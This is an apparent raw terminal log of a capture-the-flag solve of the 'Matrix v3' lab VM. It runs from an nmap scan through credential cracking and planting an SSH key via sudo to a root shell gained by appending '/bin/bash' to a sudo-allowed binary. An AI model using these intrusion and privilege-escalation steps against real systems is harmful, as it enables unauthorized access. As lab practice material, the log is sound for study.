@@ -1,0 +1,269 @@
+
+root@ap:~# nmap -A -p- 192.168.43.134
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-25 18:14 CET
+Nmap scan report for 192.168.43.134
+Host is up (0.00042s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-title: Welcome in Matrix
+6464/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
+|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
+|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
+7331/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
+| http-auth: 
+| HTTP/1.0 401 Unauthorized\x0D
+|_  Basic realm=Login to Matrix
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:B2:0D:67 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.42 ms 192.168.43.134
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.29 seconds
+
+
+
+Basic bmVvOnBhc3N3b3Jknot authenticated
+base64   neo:password
+
+
+
+admin:76a2173be6393254e72ffa4d6df1030a
+
+
+root@ap:~/Scrivania/CTF/Matrix_v3# john hash --format=raw-md5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+passwd           (?)
+1g 0:00:00:00 DONE 2/3 (2020-02-25 19:01) 25.00g/s 67200p/s 67200c/s 67200C/s chacha..nermal
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+
+
+
+admin:passwd
+
+
+guest:7R1n17yN30
+
+
+
+root@ap:~# python -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...
+192.168.43.56 - - [25/Feb/2020 22:20:58] "GET /id_rsa.pub HTTP/1.1" 200 -
+
+
+
+guest@matrix:~$ wget 192.168.43.226:8888/id_rsa.pub
+--2020-02-25 21:20:56--  http://192.168.43.226:8888/id_rsa.pub
+Connecting to 192.168.43.226:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 561 [application/octet-stream]
+Saving to: ‘id_rsa.pub’
+
+id_rsa.pub              100%[=============================>]     561  --.-KB/s    in 0s      
+
+2020-02-25 21:20:57 (47.5 MB/s) - ‘id_rsa.pub’ saved [561/561]
+
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ ll
+total 36
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Desktop/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Documents/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Downloads/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Music/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Pictures/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Public/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Videos/
+-rw-r--r-- 1 guest users  561 Feb 25 21:20 id_rsa.pub
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 prog/
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ chmod 777 id_rsa.pub 
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ ll
+total 36
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Desktop/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Documents/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Downloads/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Music/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Pictures/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Public/
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 Videos/
+-rwxrwxrwx 1 guest users  561 Feb 25 21:20 id_rsa.pub*
+drwxr-xr-x 2 guest users 4096 Aug  6  2018 prog/
+guest@matrix:~$ 
+guest@matrix:~$ 
+guest@matrix:~$ sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
+
+
+
+root@ap:~/.ssh# ssh trinity@192.168.43.56 -p 6464 -i id_rsa
+Last login: Mon Aug  6 16:37:45 2018 from 192.168.56.102
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ ls
+Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ id
+uid=1001(trinity) gid=1001(trinity) groups=1001(trinity)
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ sudo -l
+User trinity may run the following commands on matrix:
+    (root) NOPASSWD: /home/trinity/oracle
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ ls -la
+total 72
+drwxr-xr-x 14 trinity trinity 4096 Apr  3  2019 ./
+drwxr-xr-x  7 root    root    4096 Aug  6  2018 ../
+-rw-------  1 trinity trinity   52 Aug  6  2018 .Xauthority
+-rw-------  1 trinity trinity    6 Apr  3  2019 .bash_history
+drwxr-xr-x  5 trinity trinity 4096 Aug  6  2018 .cache/
+drwxr-xr-x 11 trinity trinity 4096 Aug  6  2018 .config/
+drwx------  3 trinity trinity 4096 Aug  6  2018 .dbus/
+-rw-------  1 trinity trinity   16 Aug  6  2018 .esd_auth
+-rw-r--r--  1 trinity trinity 3729 Oct 23  2017 .screenrc
+drwxr-xr-x  2 trinity trinity 4096 Feb 25 21:21 .ssh/
+drwx------  4 trinity trinity 4096 Aug  6  2018 .thumbnails/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Desktop/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Documents/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Downloads/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Music/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Pictures/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Public/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Videos/
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ pwd
+/home/trinity
+trinity@matrix:~$ cd 
+.Xauthority    .dbus/         .thumbnails/   Music/         
+.bash_history  .esd_auth      Desktop/       Pictures/      
+.cache/        .screenrc      Documents/     Public/        
+.config/       .ssh/          Downloads/     Videos/        
+trinity@matrix:~$ 
+Display all 1720 possibilities? (y or n)
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ ll
+-bash: ll: command not found
+trinity@matrix:~$ ls -la
+total 72
+drwxr-xr-x 14 trinity trinity 4096 Apr  3  2019 ./
+drwxr-xr-x  7 root    root    4096 Aug  6  2018 ../
+-rw-------  1 trinity trinity   52 Aug  6  2018 .Xauthority
+-rw-------  1 trinity trinity    6 Apr  3  2019 .bash_history
+drwxr-xr-x  5 trinity trinity 4096 Aug  6  2018 .cache/
+drwxr-xr-x 11 trinity trinity 4096 Aug  6  2018 .config/
+drwx------  3 trinity trinity 4096 Aug  6  2018 .dbus/
+-rw-------  1 trinity trinity   16 Aug  6  2018 .esd_auth
+-rw-r--r--  1 trinity trinity 3729 Oct 23  2017 .screenrc
+drwxr-xr-x  2 trinity trinity 4096 Feb 25 21:21 .ssh/
+drwx------  4 trinity trinity 4096 Aug  6  2018 .thumbnails/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Desktop/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Documents/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Downloads/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Music/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Pictures/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Public/
+drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Videos/
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ echo "/bin/bash" >> oracle
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ sudo -u oracle 
+sudo: unknown user: oracle
+sudo: unable to initialize policy plugin
+trinity@matrix:~$ chmod +x oracle 
+trinity@matrix:~$ 
+trinity@matrix:~$ 
+trinity@matrix:~$ sudo -u root ./oracle 
+root@matrix:/home/trinity# 
+root@matrix:/home/trinity# 
+root@matrix:/home/trinity# 
+root@matrix:/home/trinity# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+root@matrix:/home/trinity# 
+root@matrix:/home/trinity# 
+root@matrix:/home/trinity# 
+root@matrix:/home/trinity# cd
+root@matrix:~# 
+root@matrix:~# 
+root@matrix:~# ll
+total 32
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Desktop/
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Documents/
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Downloads/
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Music/
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Pictures/
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Public/
+drwxr-xr-x 2 root root 4096 Aug  6  2018 Videos/
+-rw-r--r-- 1 root root 1039 Apr  3  2019 flag.txt
+root@matrix:~# cat flag
+cat: flag: No such file or directory
+root@matrix:~# cat flag.txt 
+
+
+             ,----------------,              ,---------,
+        ,-----------------------,          ,"        ,"|
+      ,"                      ,"|        ,"        ,"  |
+     +-----------------------+  |      ,"        ,"    |
+     |  .-----------------.  |  |     +---------+      |
+     |  |                 |  |  |     | -==----'|      |
+     |  |  Matrix is      |  |  |     |         |      |
+     |  |  compromised    |  |  |/----|`---=    |      |
+     |  |  C:\>_reload    |  |  |   ,/|==== ooo |      ;
+     |  |                 |  |  |  // |(((( [33]|    ,"
+     |  `-----------------'  |," .;'| |((((     |  ,"
+     +-----------------------+  ;;  | |         |,"     -morpheus AKA (unknowndevice64)-
+        /_)______________(_/  //'   | +---------+
+   ___________________________/___  `,
+  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+ / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+/_==__==========__==_ooo__ooo=_/'   /___________,"
+`-----------------------------'
+
+-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-
+root@matrix:~# 
+
+
+
